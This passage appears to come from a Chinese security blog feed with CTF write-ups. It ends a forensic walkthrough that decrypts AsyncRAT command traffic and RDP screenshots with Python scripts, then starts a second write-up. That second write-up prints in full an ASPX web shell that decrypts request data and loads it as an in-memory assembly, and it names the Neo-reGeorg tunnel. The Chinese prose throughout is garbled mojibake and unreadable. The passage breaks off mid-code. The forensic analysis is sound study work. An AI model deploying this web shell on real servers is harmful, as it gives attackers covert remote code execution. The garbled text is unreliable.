class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> len_data != <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;MZ&#x27;</span>):</span><br><span class="line">            filename = <span class="string">&quot;dll_&quot;</span> + hash_data_sha256(data)</span><br><span class="line">            write_file(filename, data)</span><br><span class="line">            output = <span class="string">&quot;ä¿å­˜DLLï¼Œæ–‡ä»¶åä¸º-&quot;</span> + filename</span><br><span class="line">            <span class="keyword">return</span> output, <span class="number">1</span> + <span class="number">4</span> + len_zipdata</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output, off = parseMsgPack(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;wallpaper&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">                <span class="keyword">if</span> off + <span class="number">5</span> &lt; <span class="built_in">len</span>(data):</span><br><span class="line">                    len_image = getbuflen(data[off+<span class="number">1</span>:off+<span class="number">5</span>], <span class="literal">False</span>)</span><br><span class="line">                    <span class="keyword">if</span> off + <span class="number">5</span> + len_image &lt;= <span class="built_in">len</span>(data):</span><br><span class="line">                        imagedata = data[off+<span class="number">5</span>:off+<span class="number">5</span>+len_image]</span><br><span class="line">                        filename = <span class="string">&quot;image_&quot;</span> + hash_data_sha256(imagedata)</span><br><span class="line">                        write_file(filename, imagedata)</span><br><span class="line">                        output = <span class="string">&quot;ä¿å­˜å›¾ç‰‡ï¼Œæ–‡ä»¶åä¸º-&quot;</span> + filename</span><br><span class="line">            <span class="keyword">return</span> output, <span class="number">1</span> + <span class="number">4</span> + len_zipdata</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_bin_file</span>(<span class="params">filename, output_file</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;å¤„ç†å•ä¸ªbinæ–‡ä»¶&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è¯»å–æ–‡ä»¶å¤±è´¥ <span class="subst">&#123;filename&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç†æ–‡ä»¶: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">    base_name = os.path.splitext(os.path.basename(filename))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">f&quot;\n=== å¤„ç†æ–‡ä»¶: <span class="subst">&#123;filename&#125;</span> ===\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    pkt_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> num &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="keyword">if</span> num + <span class="number">4</span> &gt; <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        len_encodedata = getbuflen(data[num:num+<span class="number">4</span>], <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> num + len_encodedata + <span class="number">4</span> &gt; <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        encodedata = data[num+<span class="number">4</span>:num+<span class="number">4</span>+len_encodedata]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(encodedata) &lt; <span class="number">4</span>:</span><br><span class="line">            num += len_encodedata + <span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        len_decodedata = getbuflen(encodedata[:<span class="number">4</span>], <span class="literal">True</span>)</span><br><span class="line">        zipdata = encodedata[<span class="number">4</span>:]</span><br><span class="line">        decodedata = gzip_uncompress(zipdata)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> decodedata <span class="keyword">and</span> <span class="built_in">len</span>(decodedata) == len_decodedata:</span><br><span class="line">            <span class="comment"># ä¿å­˜è§£å¯†æ•°æ®åˆ°ç»Ÿä¸€æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;--- æ•°æ®åŒ… <span class="subst">&#123;pkt_num&#125;</span> ---\n&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> len_encodedata &gt; <span class="number">0x200</span>:</span><br><span class="line">                    f.write(<span class="string">f&quot;åŠ å¯†æ•°æ®ï¼š<span class="subst">&#123;binascii.hexlify(data[num:num+<span class="number">0x200</span>+<span class="number">4</span>]).decode()&#125;</span>\n&quot;</span>)</span><br><span class="line">                    f.write(<span class="string">f&quot;è§£å¯†æ•°æ®_hexï¼š<span class="subst">&#123;binascii.hexlify(decodedata[:<span class="number">0x200</span>]).decode()&#125;</span>\n&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f.write(<span class="string">f&quot;åŠ å¯†æ•°æ®ï¼š<span class="subst">&#123;binascii.hexlify(data[num:num+len_encodedata+<span class="number">4</span>]).decode()&#125;</span>\n&quot;</span>)</span><br><span class="line">                    f.write(<span class="string">f&quot;è§£å¯†æ•°æ®_hexï¼š<span class="subst">&#123;binascii.hexlify(decodedata).decode()&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">                output, off = parseMsgPack(decodedata)</span><br><span class="line">                <span class="keyword">if</span> off != <span class="built_in">len</span>(decodedata):</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;2-&gt;Packet-&gt;pong-&gt;Message&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">                        f.write(<span class="string">&quot;Error\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">f&quot;è§£å¯†é€šä¿¡æŒ‡ä»¤ï¼š<span class="subst">&#123;output&#125;</span>\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;å·²å¤„ç†æ•°æ®åŒ… <span class="subst">&#123;pkt_num&#125;</span>&quot;</span>)</span><br><span class="line">            pkt_num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;!!!è§£å‹å¤±è´¥!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        num += len_encodedata + <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸»å‡½æ•°&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># è·å–æ‰€æœ‰binæ–‡ä»¶</span></span><br><span class="line">    bin_files = glob.glob(<span class="string">&quot;*.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æ‰¾åˆ° <span class="subst">&#123;<span class="built_in">len</span>(bin_files)&#125;</span> ä¸ªbinæ–‡ä»¶&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ›å»ºç»Ÿä¸€çš„è¾“å‡ºæ–‡ä»¶</span></span><br><span class="line">    output_file = <span class="string">&quot;decrypted_output.txt&quot;</span></span><br><span class="line">    <span class="comment"># æ¸…ç©ºæ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;è§£å¯†æŠ¥å‘Š - æ‰€æœ‰binæ–‡ä»¶æ•°æ®\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;=&quot;</span> * <span class="number">50</span> + <span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> bin_files:</span><br><span class="line">        process_bin_file(filename, output_file)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;è§£å¯†å®Œæˆï¼Œç»“æœä¿å­˜åˆ° <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208114712047.png" alt="image-20251208114712047"></p><p>ç„¶åå°±å¯ä»¥è§£å‡ºæ‰€æœ‰ç›¸å…³ä¿¡æ¯äº†ã€‚è¿™é‡Œå°ä¼™ä¼´åˆè¯´å¿˜è®°é¢˜ç›®æ˜¯å•¥äº†ï¼Œæ ¹æ®å·²çŸ¥çš„ä¿¡æ¯ï¼Œå¹¶æ²¡æœ‰flagå…³é”®å­—ï¼Œé‚£æˆ‘ä»¬å°±å°†æ‰€æœ‰çš„æµé‡æå‡ºæ¥ï¼Œè¿™é‡Œä½ ä¼šé—®ï¼Œä¸æ˜¯å·²ç»æŠŠæ‰€æœ‰çš„æµé‡éƒ½è§£å‡ºæ¥äº†ä¹ˆï¼Œæ˜¯çš„ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªæ²¡æœ‰è§£å‡ºæ¥ï¼Œå°±æ˜¯&gt;remoteDesktop-ï¼Œè¿™æ˜¯è¿œç¨‹æ¡Œé¢çš„æµé‡ï¼Œå¯èƒ½å‡ºé¢˜äººåªæ˜¯è¿œç¨‹cat flagï¼Œ<br><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208115110698.png" alt="image-20251208115110698"></p><p>2æµå°±æ˜¯æ‰€æœ‰çš„æ•°æ®ï¼Œæƒ³åŠæ³•æå‡ºæ¥ï¼Œé¦–å…ˆæ‰¾åˆ°<br><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208153855522.png" alt="image-20251208153855522"></p><p>è¿™ç§é•¿çš„æµï¼Œå¾ˆé•¿ï¼Œ<br><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208153926853.png" alt="image-20251208153926853"></p><p>å…ˆè§£hex  åœ¨è§£gunzip  åœ¨è¿›è¡Œtohexï¼Œè¿™é‡Œå°±æœ‰å›¾ç‰‡çš„å‰ç¼€äº†ï¼Œ<br><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208154008001.png" alt="image-20251208154008001"></p><p><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208154038631.png" alt="image-20251208154038631"></p><p>ç„¶ååœ¨è§£ç å°±å¥½äº†ã€‚<br><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208154146413.png" alt="image-20251208154146413"></p><p>å°±å¯ä»¥è§£å¯†æ‰€æœ‰rdpçš„æµé‡äº†ï¼Œä¸€ä¸ªä¸€ä¸ªæç¡®å®æœ‰ç‚¹å°æ…¢ï¼Œè¿™é‡Œç®€å•å†™ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> reverse_data, bytes_to_int, gzip_uncompress</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbuflen</span>(<span class="params">buf, isreverse=<span class="literal">False</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;è·å–ç¼“å†²åŒºé•¿åº¦&quot;&quot;&quot;</span></span><br><span class="line">    tmp = buf[:]</span><br><span class="line">    <span class="keyword">if</span> isreverse:</span><br><span class="line">        tmp = reverse_data(tmp)</span><br><span class="line">    <span class="keyword">return</span> bytes_to_int(tmp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_jpeg_from_bin</span>(<span class="params">bin_file, output_dir</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä» bin æ–‡ä»¶ä¸­æå– JPEG å›¾åƒ&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_dir):</span><br><span class="line">        os.makedirs(output_dir)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(bin_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è¯»å–æ–‡ä»¶å¤±è´¥ <span class="subst">&#123;bin_file&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç†æ–‡ä»¶: <span class="subst">&#123;bin_file&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    pkt_num = <span class="number">0</span></span><br><span class="line">    jpeg_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> num &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="keyword">if</span> num + <span class="number">4</span> &gt; <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        len_encodedata = getbuflen(data[num:num+<span class="number">4</span>], <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> num + len_encodedata + <span class="number">4</span> &gt; <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        encodedata = data[num+<span class="number">4</span>:num+<span class="number">4</span>+len_encodedata]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(encodedata) &lt; <span class="number">4</span>:</span><br><span class="line">            num += len_encodedata + <span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        len_decodedata = getbuflen(encodedata[:<span class="number">4</span>], <span class="literal">True</span>)</span><br><span class="line">        zipdata = encodedata[<span class="number">4</span>:]</span><br><span class="line">        decodedata = gzip_uncompress(zipdata)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> decodedata <span class="keyword">and</span> <span class="built_in">len</span>(decodedata) == len_decodedata:</span><br><span class="line">            <span class="comment"># æŸ¥æ‰¾ JPEG æ•°æ®</span></span><br><span class="line">            soi_index = decodedata.find(<span class="string">b&#x27;\xff\xd8\xff\xe0&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> soi_index != -<span class="number">1</span>:</span><br><span class="line">                jpeg_data = decodedata[soi_index:]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># æŸ¥æ‰¾ EOI æ ‡è®°</span></span><br><span class="line">                eoi_index = jpeg_data.find(<span class="string">b&#x27;\xff\xd9&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> eoi_index != -<span class="number">1</span>:</span><br><span class="line">                    jpeg_data = jpeg_data[:eoi_index + <span class="number">2</span>]  <span class="comment"># åŒ…å« EOI</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># ä¿å­˜ JPEG æ–‡ä»¶</span></span><br><span class="line">                    filename = <span class="string">f&quot;<span class="subst">&#123;output_dir&#125;</span>/packet_<span class="subst">&#123;pkt_num&#125;</span>.jpg&quot;</span></span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> img_file:</span><br><span class="line">                        img_file.write(jpeg_data)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;æå– JPEG: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">                    jpeg_count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;æ•°æ®åŒ… <span class="subst">&#123;pkt_num&#125;</span>: æœªæ‰¾åˆ° JPEG EOI æ ‡è®°&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;æ•°æ®åŒ… <span class="subst">&#123;pkt_num&#125;</span>: æœªæ‰¾åˆ° JPEG SOI æ ‡è®°&quot;</span>)</span><br><span class="line"></span><br><span class="line">            pkt_num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;æ•°æ®åŒ… <span class="subst">&#123;pkt_num&#125;</span>: è§£å‹å¤±è´¥&quot;</span>)</span><br><span class="line"></span><br><span class="line">        num += len_encodedata + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\næå–å®Œæˆï¼Œå…±æå– <span class="subst">&#123;jpeg_count&#125;</span> ä¸ª JPEG å›¾åƒåˆ° <span class="subst">&#123;output_dir&#125;</span> ç›®å½•&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    extract_jpeg_from_bin(<span class="string">&quot;bb.bin&quot;</span>, <span class="string">&quot;extracted_images&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±ä¼šç”Ÿæˆä¸€ä¸ªç›®å½•ï¼Œ<img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208154454994.png" alt="image-20251208154454994"></p><p>å¯ä»¥çœ‹åˆ°æ”»å‡»è€…rdpäº†ä¸»æœºï¼Œçœ‹äº†ä¸€ä¸ªç¨‹åº up.exe<br><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208154747469.png" alt="image-20251208154747469"></p><p>åœ¨è§£æä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°ç›¸å…³ç¨‹åºã€‚</p><p>æ€»çš„æ¥è¯´å°±æ˜¯å…ˆè§£tlsï¼Œåœ¨è¿›è¡Œå»é™¤ä¸éœ€è¦çš„æ•°æ®ï¼Œåœ¨è¿›è¡Œgunzipã€‚</p><p>è¿™é‡Œå°ä¼™ä¼´ä¹Ÿæ˜¯ä¸çŸ¥é“é—®é¢˜æ˜¯å•¥äº†ï¼Œçœ‹æ‰€æœ‰æ•°æ®åº”è¯¥æ˜¯è¿™ä¸ªäº†ï¼Œæœ‰å°ä¼™ä¼´çŸ¥é“çš„è¯ï¼Œéº»çƒ¦å‘ŠçŸ¥ä¸€ä¸‹ï¼Œå’±ä»¬åœ¨ç ”ç©¶ã€‚<br>åšè¿™é“é¢˜èŠ±è´¹äº†ä¸€ä¸‹åˆçš„æ—¶é—´ï¼Œå¹¶ä¸”åœ¨ä¸€ç›´æŸ¥èµ„æ–™é—®gptï¼Œå°ä¼™ä¼´è¯´æ¯”èµ›ç¯å¢ƒæ˜¯ä¸å‡ºç½‘çš„ï¼Œå•Šè¿™ã€‚</p><h4 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h4><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚å¦‚æœæ‚¨æ„Ÿè§‰æ–‡ç« å†™çš„ä¸é”™ï¼Œå¸®ç¬”è€…ç‚¹ç»™å…¬ä¼—å·ç‚¹ç‚¹å…³æ³¨ï¼Œå…ˆè°¢è°¢å¤§å®¶äº†ã€‚</p><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/AJUQ8Zd_4Q3Ub9TarQx5Gg AsyncRATé€šä¿¡æ¨¡å‹å‰–æ</span><br><span class="line">https://xz.aliyun.com/news/12945AsyncRATé€šä¿¡æ¨¡å‹å‰–æåŠè‡ªåŠ¨åŒ–è§£å¯†è„šæœ¬å®ç°</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2025ç”µä¿¡é›†å›¢æ”»é˜²å†³èµ›éƒ¨åˆ†wp</title>
      <link href="/2025/12/04/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/12/04/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>å°ä¼™ä¼´ç»™äº†ä¸¤é“ctfè¯´å¸®å¿™çœ‹çœ‹ï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œè¿™é‡Œç®€å•è®°å½•ä¸€ä¸‹ã€‚</p><h4 id="è°çŸ¥ç›˜ä¸­é¤"><a href="#è°çŸ¥ç›˜ä¸­é¤" class="headerlink" title="è°çŸ¥ç›˜ä¸­é¤"></a>è°çŸ¥ç›˜ä¸­é¤</h4><p>å¼€å±€ç»™åˆ°ä¸€ä¸ªä¸‰ä¸ªæ–‡ä»¶</p><p><img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204101352261.png" alt="image-20251204101352261"></p><p><img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204101415917.png" alt="image-20251204101415917"></p><p>csvä¸çŸ¥é“æ˜¯ä»€ä¹ˆè®¾å¤‡å¯¼å‡ºçš„æµé‡ï¼Œä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯æœ¨é©¬ä¸€ä¸ªæ˜¯httpéš§é“ï¼ŒNeo-reGeorgçš„ï¼Œ</p><p>å…ˆæ¥çœ‹æœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Type cT = Context.GetType();PropertyInfo rP = cT.GetProperty(GetStr(0));string rT = (string)rP.GetValue(Context, null).GetType().GetProperty(GetStr(1)).GetValue(rP.GetValue(Context,null),null);if (rT.Equals(GetStr(2)))&#123;try &#123;string key=GetStr(3);string initVector=GetStr(4);object reqst=rP.GetValue(Context, null);PropertyInfo itemProperty=reqst.GetType().GetProperty(GetStr(5));string sdata=(string)itemProperty.GetValue(reqst,new object[]&#123;GetStr(6)&#125;);string sdatac=(string)itemProperty.GetValue(reqst,new object[]&#123;&quot;flag&quot;&#125;);if(sdatac != null &amp;&amp;sdatac.Contains(&quot;tungtungtungsahur&quot;))&#123;Context.Application[&quot;sfavlaunch&quot;] = null;Context.Response.Write(&quot;OK&quot;);return;&#125;byte[] data=RD(sdata);data=new RijndaelManaged().CreateDecryptor(Encoding.Default.GetBytes(key),Encoding.Default.GetBytes(initVector)).TransformFinalBlock(data,0,data.Length);if(Context.Application[&quot;sfavlaunch&quot;] == null) &#123;MethodInfo methodInfo = typeof(Assembly).GetMethod(GetStr(7), new System.Type[] &#123; typeof(byte[]) &#125;);object result = methodInfo.Invoke(null, new object[] &#123; data &#125;);Assembly assembly = (Assembly)result;Context.Application[&quot;sfavlaunch&quot;] = assembly;&#125;else&#123;System.IO.MemoryStream outStream =new System.IO.MemoryStream();Assembly a=(Assembly)Context.Application[&quot;sfavlaunch&quot;];object o=a.CreateInstance(GetStr(8));o.Equals(outStream);o.Equals(data);o.ToString();byte[] r=outStream.ToArray();string sign=RE(new RijndaelManaged().CreateEncryptor(Encoding.Default.GetBytes(key),Encoding.Default.GetBytes(initVector)).TransformFinalBlock(r, 0, r.Length));Context.Response.Write(&quot;&#123;\&quot;msg\&quot;:\&quot;&quot;+sign+&quot;\&quot;&#125;&quot;);&#125;&#125;catch(System.Exception)&#123;Context.Response.Write(&quot;&#123;\&quot;Error\&quot;:\&quot;Password Error\&quot;&#125;&#125;&quot;);&#125;&#125;else&#123;Context.Response.Write(&quot;&#123;\&quot;Error\&quot;:\&quot;Unauthorized\&quot;&#125;&#125;&quot;);&#125;%&gt;&lt;script runat=&quot;server&quot;&gt;public static string RE(byte[] bytes) &#123;byte[] tmp = bytes;int num = 1;if (bytes.Length &gt; 512000) &#123;num = 1;&#125; else &#123;Random rnd = new Random();num = rnd.Next(2, 10);&#125;for (int i = 0; i &lt; num; i++) &#123;tmp = Encoding.UTF8.GetBytes(&quot;sign:&quot; + Reverse(B64e(tmp)));&#125;tmp = Encoding.UTF8.GetBytes(B64e(tmp));return Encoding.UTF8.GetString(tmp);&#125;public static byte[] 